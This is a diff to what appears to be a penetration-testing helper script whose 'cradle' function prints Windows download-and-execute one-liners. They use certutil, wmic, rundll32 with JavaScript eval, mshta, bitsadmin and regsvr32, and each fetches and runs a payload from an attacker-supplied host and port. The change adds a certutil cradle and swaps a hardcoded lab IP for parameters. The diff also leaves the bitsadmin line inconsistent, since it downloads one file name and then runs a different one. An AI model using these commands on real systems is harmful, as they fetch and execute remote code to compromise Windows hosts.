@@ -156,15 +156,17 @@ function cradle {
 
 	cat << EOF
 
-   wmic os get /FORMAT:"http://$1:$2/$3.xsl
+   certutil -urlcache -split -f http://$1:$2/$3 & $3
+   
+   wmic os get /FORMAT:"http://$1:$2/$3
 
    rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://$1:$2/$3",false);x.send();eval(x.responseText);window.close();
 
    mshta http://$1:$2/$3
 
-   bitsadmin /transfer kTxCy /download /priority high http://$1:$2/$3.wsf %temp%\$3.wsf & start /wait %temp%\$3.wsf & del %temp%\$3.wsf
+   bitsadmin /transfer OK /download /priority high http://$1:$2/$3 %temp%\$3 & start /wait %temp%\$3.wsf & del %temp%\$3.wsf
 
-   regsvr32 /s /u /n /i:http://10.10.14.53:9998/$3 scrobj
+   regsvr32 /s /u /n /i:http://$1:$2/$3 scrobj
 
 
 EOF
